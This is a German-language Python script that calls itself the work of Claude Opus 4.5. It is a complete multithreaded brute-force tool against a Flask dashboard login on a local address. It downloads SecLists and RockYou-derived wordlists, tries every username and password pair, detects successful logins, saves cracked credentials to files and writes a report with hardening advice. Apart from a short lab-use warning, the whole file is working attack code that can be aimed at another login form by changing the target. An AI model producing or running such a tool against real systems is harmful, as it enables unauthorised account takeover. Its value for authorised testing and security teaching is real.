"""
Erstellt von CLaude Opus 4.5 am 01.02.2026

Brute-Force Angriff gegen Flask-Dashboard Login
MIT INTERNET-WORTLISTEN (SecLists / RockYou)
"""

import requests
import time
import csv
import os
import json
import threading
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import List, Tuple
from itertools import product

CONFIG = {
    "target_ip": "192.168.0.100",
    "target_port": 5000,
    "login_endpoint": "/",
    
    "wordlists": {
        "usernames": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
        "passwords": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
    },
    
    "fallback_usernames": [
        "admin", "root", "user", "administrator", "Admin",
        "pi", "raspberry", "test", "camera", "cam"
    ],
    "fallback_passwords": [
        "admin", "password", "123456", "1234", "12345678",
        "root", "raspberry", "pi", "test", "camera"
    ],
    
    "max_usernames": 50,    
    "max_passwords": 1000, 
    
    "threads": 10,
    "delay_between_attempts": 0.05,
    "timeout": 5,
    "stop_on_success": True,
    
    "output_dir": "bruteforce_results"
}


class WordlistDownloader:
    """Lädt Wortlisten aus dem Internet"""
    
    KNOWN_LISTS = {
        "usernames_short": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
        "usernames_names": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt",
        
        "passwords_10k": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "passwords_100k": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt",
        "passwords_rockyou_50k": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-50.txt",
        
        "default_passwords": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.txt",
        
        "iot_passwords": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.txt"
    }
    
    @staticmethod
    def download(url: str, max_entries: int = None) -> List[str]:
        """Lädt eine Wortliste von URL"""
        print(f"  📥 Lade: {url[:60]}...")
        
        try:
            response = requests.get(url, timeout=30)
            response.raise_for_status()
            
            lines = response.text.strip().split('\n')
            lines = [line.strip() for line in lines if line.strip() and not line.startswith('#')]
            
            if max_entries:
                lines = lines[:max_entries]
            
            print(f"  ✅ Geladen: {len(lines)} Einträge")
            return lines
            
        except Exception as e:
            print(f"  ❌ Fehler: {e}")
            return []
    
    @staticmethod
    def download_multiple(urls: List[str], max_entries: int = None) -> List[str]:
        """Lädt mehrere Listen und kombiniert sie"""
        all_entries = []
        for url in urls:
            entries = WordlistDownloader.download(url, max_entries)
            all_entries.extend(entries)
        
        unique = list(dict.fromkeys(all_entries))
        return unique[:max_entries] if max_entries else unique

@dataclass
class LoginAttempt:
    timestamp: str
    username: str
    password: str
    success: bool
    response_time_ms: float
    http_status: int
    response_length: int

@dataclass
class BruteForceReport:
    experiment_name: str = "Brute-Force Admin-Login (Internet-Wortlisten)"
    experiment_date: str = ""
    experiment_time: str = ""
    target: str = ""
    
    username_source: str = ""
    password_source: str = ""
    total_usernames: int = 0
    total_passwords: int = 0
    total_combinations: int = 0
    threads_used: int = 0
    
    attempts_made: int = 0
    successful_logins: List[dict] = field(default_factory=list)
    credentials_found: List[str] = field(default_factory=list)
  
    start_time: str = ""
    end_time: str = ""
    duration_seconds: float = 0
    attempts_per_second: float = 0
  
    rate_limiting_detected: bool = False
    account_lockout_detected: bool = False
    captcha_detected: bool = False
    
    weak_credentials_found: bool = False
    vulnerability_confirmed: bool = False
    
    all_attempts: List[dict] = field(default_factory=list)


class BruteForceAttacker:
    def __init__(self, config: dict):
        self.config = config
        self.target_url = f"http://{config['target_ip']}:{config['target_port']}"
        self.login_url = f"{self.target_url}{config['login_endpoint']}"
        
        self.usernames = []
        self.passwords = []
        
        self.attempts: List[LoginAttempt] = []
        self.found_credentials: List[Tuple[str, str]] = []
        self.stop_attack = False
        self.lock = threading.Lock()
        
        self.report = BruteForceReport()
        
        os.makedirs(config['output_dir'], exist_ok=True)
        self.run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        self.attempt_count = 0
        self.start_time = None
    
    def log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        symbols = {
            "INFO": "ℹ️ ", "ATTACK": "🔓", "SUCCESS": "✅",
            "FAIL": "❌", "WARN": "⚠️ ", "FOUND": "🎯",
            "DOWNLOAD": "📥"
        }
        print(f"[{timestamp}] {symbols.get(level, '•')} {msg}")
    
    def load_wordlists(self):
        """Wortlisten laden (Internet oder Fallback)"""
        self.log("Lade Wortlisten...", "DOWNLOAD")
        
        self.log("Benutzernamen:", "DOWNLOAD")
        self.usernames = WordlistDownloader.download(
            self.config['wordlists']['usernames'],
            self.config['max_usernames']
        )
        
        if not self.usernames:
            self.log("Verwende Fallback-Benutzernamen", "WARN")
            self.usernames = self.config['fallback_usernames']
        
        self.report.username_source = self.config['wordlists']['usernames']
        
        self.log("Passwörter:", "DOWNLOAD")
        self.passwords = WordlistDownloader.download(
            self.config['wordlists']['passwords'],
            self.config['max_passwords']
        )
        
        if not self.passwords:
            self.log("Verwende Fallback-Passwörter", "WARN")
            self.passwords = self.config['fallback_passwords']
        
        self.report.password_source = self.config['wordlists']['passwords']
        
        if "admin" not in self.usernames:
            self.usernames.insert(0, "admin")
        if "admin" not in self.passwords:
            self.passwords.insert(0, "admin")
        
        self.log(f"Geladen: {len(self.usernames)} Benutzernamen, {len(self.passwords)} Passwörter", "SUCCESS")
    
    def try_login(self, username: str, password: str) -> LoginAttempt:
        timestamp = datetime.now().isoformat()
        
        try:
            start = time.time()
            
            response = requests.post(
                self.login_url,
                data={"username": username, "password": password},
                timeout=self.config['timeout'],
                allow_redirects=True
            )
            
            response_time = (time.time() - start) * 1000
            
            success = (
                "dashboard" in response.url or
                "/dashboard" in response.url or
                (response.status_code == 200 and "Falsch" not in response.text and len(response.text) > 500)
            )
            
            if "Falsch" in response.text:
                success = False
            
            return LoginAttempt(
                timestamp=timestamp,
                username=username,
                password=password,
                success=success,
                response_time_ms=round(response_time, 2),
                http_status=response.status_code,
                response_length=len(response.text)
            )
            
        except requests.exceptions.Timeout:
            return LoginAttempt(
                timestamp=timestamp, username=username, password=password,
                success=False, response_time_ms=self.config['timeout'] * 1000,
                http_status=0, response_length=0
            )
        except Exception:
            return LoginAttempt(
                timestamp=timestamp, username=username, password=password,
                success=False, response_time_ms=0, http_status=-1, response_length=0
            )
    
    def worker(self, combinations: List[Tuple[str, str]]):
        for username, password in combinations:
            if self.stop_attack:
                break
            
            attempt = self.try_login(username, password)
            
            with self.lock:
                self.attempts.append(attempt)
                self.attempt_count += 1
                
                progress = (self.attempt_count / self.report.total_combinations) * 100
                
                if attempt.success:
                    self.found_credentials.append((username, password))
                    self.log(
                        f"GEFUNDEN! {username}:{password} "
                        f"(Versuch {self.attempt_count})",
                        "FOUND"
                    )
                    
                    if self.config['stop_on_success']:
                        self.stop_attack = True
                else:
                    if self.attempt_count % 50 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.attempt_count / elapsed if elapsed > 0 else 0
                        self.log(
                            f"Versuch {self.attempt_count}/{self.report.total_combinations} "
                            f"({progress:.1f}%) - {rate:.1f}/s - {username}:{password[:10]}...",
                            "ATTACK"
                        )
            
            time.sleep(self.config['delay_between_attempts'])
    
    def run_attack(self):
        all_combinations = list(product(self.usernames, self.passwords))
        total = len(all_combinations)
        
        self.report.total_usernames = len(self.usernames)
        self.report.total_passwords = len(self.passwords)
        self.report.total_combinations = total
        self.report.threads_used = self.config['threads']
        
        self.log(f"Starte Brute-Force Angriff", "ATTACK")
        self.log(f"  Ziel:           {self.login_url}")
        self.log(f"  Benutzernamen:  {len(self.usernames)}")
        self.log(f"  Passwörter:     {len(self.passwords)}")
        self.log(f"  Kombinationen:  {total:,}")
        self.log(f"  Threads:        {self.config['threads']}")
        
        estimated_time = (total * self.config['delay_between_attempts']) / self.config['threads']
        self.log(f"  Geschätzte Zeit: {estimated_time/60:.1f} Minuten")
        
        self.start_time = time.time()
        self.report.start_time = datetime.now().isoformat()
        
        chunk_size = len(all_combinations) // self.config['threads'] + 1
        chunks = [
            all_combinations[i:i + chunk_size]
            for i in range(0, len(all_combinations), chunk_size)
        ]
        
        threads = []
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        end_time = time.time()
        self.report.end_time = datetime.now().isoformat()
        self.report.duration_seconds = round(end_time - self.start_time, 2)
        self.report.attempts_made = self.attempt_count
        
        if self.report.duration_seconds > 0:
            self.report.attempts_per_second = round(
                self.attempt_count / self.report.duration_seconds, 2
            )
    
    def analyze_results(self):
        for username, password in self.found_credentials:
            self.report.credentials_found.append(f"{username}:{password}")
            self.report.successful_logins.append({
                "username": username,
                "password": password
            })
        
        self.report.weak_credentials_found = len(self.found_credentials) > 0
        self.report.vulnerability_confirmed = len(self.found_credentials) > 0
        
        response_times = [a.response_time_ms for a in self.attempts if a.response_time_ms > 0]
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            if avg_time > 1000:
                self.report.rate_limiting_detected = True
        
        status_codes = [a.http_status for a in self.attempts]
        if status_codes.count(403) > 10 or status_codes.count(429) > 0:
            self.report.account_lockout_detected = True
        
        self.report.all_attempts = [asdict(a) for a in self.attempts]
    
    def save_results(self):
        base_path = os.path.join(self.config['output_dir'], f"bruteforce_{self.run_id}")
        csv_path = f"{base_path}_attempts.csv"
        with open(csv_path, 'w', newline='') as f:
            fieldnames = [
                'timestamp', 'username', 'password', 'success',
                'response_time_ms', 'http_status', 'response_length'
            ]
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for a in self.attempts:
                writer.writerow(asdict(a))
        self.log(f"CSV gespeichert: {csv_path}", "SUCCESS")
        
        json_path = f"{base_path}_report.json"
        with open(json_path, 'w') as f:
            json.dump(asdict(self.report), f, indent=2, default=str)
        self.log(f"JSON gespeichert: {json_path}", "SUCCESS")
        
        md_path = f"{base_path}_summary.md"
        with open(md_path, 'w') as f:
            f.write(self.generate_markdown_report())
        self.log(f"Markdown gespeichert: {md_path}", "SUCCESS")
        
        if self.found_credentials:
            creds_path = f"{base_path}_credentials.txt"
            with open(creds_path, 'w') as f:
                f.write("# Gefundene Zugangsdaten\n")
                f.write(f"# Ziel: {self.target_url}\n")
                f.write(f"# Datum: {self.report.experiment_date}\n\n")
                for username, password in self.found_credentials:
                    f.write(f"{username}:{password}\n")
            self.log(f"Credentials gespeichert: {creds_path}", "FOUND")
    
    def generate_markdown_report(self) -> str:
        r = self.report
        
        creds_table = ""
        if r.credentials_found:
            creds_table = "| Username | Password |\n|----------|----------|\n"
            for cred in r.credentials_found:
                parts = cred.split(":")
                creds_table += f"| `{parts[0]}` | `{parts[1]}` |\n"
        else:
            creds_table = "*Keine Zugangsdaten gefunden*"
        
        return f"""# Brute-Force Angriff Report

## Experiment-Details

| Parameter | Wert |
|-----------|------|
| Datum | {r.experiment_date} |
| Uhrzeit | {r.experiment_time} |
| Ziel | {r.target} |

### Wortlisten

| Typ | Quelle | Anzahl |
|-----|--------|--------|
| Benutzernamen | SecLists (GitHub) | {r.total_usernames} |
| Passwörter | SecLists - 10k Most Common | {r.total_passwords} |
| **Kombinationen** | - | **{r.total_combinations:,}** |

## Ergebnisse

### Timing

| Metrik | Wert |
|--------|------|
| Dauer | {r.duration_seconds} Sekunden ({r.duration_seconds/60:.1f} Minuten) |
| Versuche durchgeführt | {r.attempts_made:,} |
| Versuche pro Sekunde | {r.attempts_per_second} |
| Threads | {r.threads_used} |

### Gefundene Zugangsdaten

{creds_table}

### Sicherheitsmechanismen

| Mechanismus | Implementiert? |
|-------------|----------------|
| Rate-Limiting | {"✅ Ja" if r.rate_limiting_detected else "❌ **NEIN**"} |
| Account-Lockout | {"✅ Ja" if r.account_lockout_detected else "❌ **NEIN**"} |
| CAPTCHA | {"✅ Ja" if r.captcha_detected else "❌ **NEIN**"} |

## Bewertung

### Schwachstellen

| Schwachstelle | Status |
|---------------|--------|
| Schwache Standard-Credentials | {"🔴 **KRITISCH**" if r.weak_credentials_found else "🟢 Nicht gefunden"} |
| Fehlendes Rate-Limiting | {"🔴 **KRITISCH** - {r.attempts_per_second} Versuche/s möglich" if not r.rate_limiting_detected else "🟢 Vorhanden"} |
| Fehlender Account-Lockout | {"🔴 **KRITISCH** - Unbegrenzte Versuche" if not r.account_lockout_detected else "🟢 Vorhanden"} |

### CIA-Triade

| Schutzziel | Status | Begründung |
|------------|--------|------------|
| **Confidentiality** | {"🔴 KRITISCH" if r.weak_credentials_found else "🟢 OK"} | {"Unbefugter Zugriff mit `" + r.credentials_found[0] + "` möglich" if r.credentials_found else "Keine schwachen Credentials"} |
| **Integrity** | {"🔴 GEFÄHRDET" if r.weak_credentials_found else "🟢 OK"} | {"Angreifer kann System manipulieren" if r.weak_credentials_found else "-"} |
| **Availability** | 🟢 OK | Angriff führte nicht zum Ausfall |

## Fazit

{"**KRITISCH:** Schwache Standard-Credentials (`" + r.credentials_found[0] + "`) in " + str(r.attempts_made) + " Versuchen gefunden. Kein Rate-Limiting oder Account-Lockout implementiert." if r.weak_credentials_found else "Keine schwachen Credentials gefunden."}

### Empfehlungen

1. **Starke Passwörter erzwingen** (min. 12 Zeichen, Groß/Klein/Zahlen/Sonderzeichen)
2. **Rate-Limiting** implementieren (max. 5 Versuche pro Minute)
3. **Account-Lockout** nach 10 Fehlversuchen (30 Min Sperre)
4. **Zwei-Faktor-Authentifizierung** (2FA) einführen
5. **Login-Versuche protokollieren** und bei Anomalien alarmieren

---
*Automatisch generiert am {r.experiment_date} um {r.experiment_time}*
*Wortlisten: SecLists (https://github.com/danielmiessler/SecLists)*
"""

    def print_summary(self):
        r = self.report
        
        print("\n" + "=" * 65)
        print("                      ZUSAMMENFASSUNG")
        print("=" * 65)
        
        if r.credentials_found:
            print(f"""
┌───────────────────────────────────────────────────────────────┐
│               🎯 ZUGANGSDATEN GEFUNDEN! 🎯                    │
├───────────────────────────────────────────────────────────────┤""")
            for cred in r.credentials_found:
                print(f"│   ➤  {cred:<55} │")
            print(f"""├───────────────────────────────────────────────────────────────┤
│                                                               │
│   Wortlisten:     SecLists (GitHub)                          │
│   Kombinationen:  {r.total_combinations:>10,}                                  │
│   Versuche:       {r.attempts_made:>10,}                                  │
│   Dauer:          {r.duration_seconds:>10.1f} Sekunden                       │
│   Geschwindigkeit:{r.attempts_per_second:>10.1f} Versuche/Sekunde            │
│                                                               │
├───────────────────────────────────────────────────────────────┤
│   FEHLENDE SICHERHEITSMECHANISMEN                            │
├───────────────────────────────────────────────────────────────┤
│   Rate-Limiting:   ❌ NICHT VORHANDEN                        │
│   Account-Lockout: ❌ NICHT VORHANDEN                        │
│   CAPTCHA:         ❌ NICHT VORHANDEN                        │
├───────────────────────────────────────────────────────────────┤
│   SCHWACHSTELLE BESTÄTIGT: JA ✅                              │
└───────────────────────────────────────────────────────────────┘
            """)
        else:
            print(f"""
┌───────────────────────────────────────────────────────────────┐
│              Keine Zugangsdaten gefunden                      │
├───────────────────────────────────────────────────────────────┤
│   Kombinationen:  {r.total_combinations:>10,}                                  │
│   Versuche:       {r.attempts_made:>10,}                                  │
│   Dauer:          {r.duration_seconds:>10.1f} Sekunden                       │
└───────────────────────────────────────────────────────────────┘
            """)

    def run_full_experiment(self):
        self.log("=" * 65)
        self.log("BRUTE-FORCE ANGRIFF (MIT INTERNET-WORTLISTEN)")
        self.log(f"Ziel: {self.login_url}")
        self.log("=" * 65)
        self.report.experiment_date = datetime.now().strftime("%Y-%m-%d")
        self.report.experiment_time = datetime.now().strftime("%H:%M:%S")
        self.report.target = self.login_url
        self.load_wordlists()
        self.run_attack()
        self.analyze_results()
        self.save_results()
        self.print_summary()

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║   BRUTE-FORCE ANGRIFF TOOL (MIT INTERNET-WORTLISTEN)             ║
    ║                                                                   ║
    ║   Wortlisten:                                                    ║
    ║   • SecLists - Top Usernames                                     ║
    ║   • SecLists - 10k Most Common Passwords                         ║
    ║                                                                   ║
    ║   ⚠️  WARNUNG: Nur im eigenen Testnetzwerk verwenden!            ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    total_combos = CONFIG['max_usernames'] * CONFIG['max_passwords']
    estimated_time = (total_combos * CONFIG['delay_between_attempts']) / CONFIG['threads']
    
    print("Konfiguration:")
    print(f"  Ziel:              http://{CONFIG['target_ip']}:{CONFIG['target_port']}/")
    print(f"  Max Benutzernamen: {CONFIG['max_usernames']}")
    print(f"  Max Passwörter:    {CONFIG['max_passwords']}")
    print(f"  Max Kombinationen: {total_combos:,}")
    print(f"  Threads:           {CONFIG['threads']}")
    print(f"  Geschätzte Zeit:   {estimated_time/60:.1f} Minuten")
    print(f"  Output:            {CONFIG['output_dir']}/")
    print()
    
    confirm = input("Experiment starten? (j/n): ").strip().lower()
    if confirm != 'j':
        print("Abgebrochen.")
        exit()
    
    attacker = BruteForceAttacker(CONFIG)
    
    try:
        attacker.run_full_experiment()
    except KeyboardInterrupt:
        print("\n[!] Durch Benutzer abgebrochen")
        attacker.analyze_results()
        attacker.save_results()
    
    print("\n✅ Experiment abgeschlossen!")
    print(f"📁 Ergebnisse in: {CONFIG['output_dir']}/")
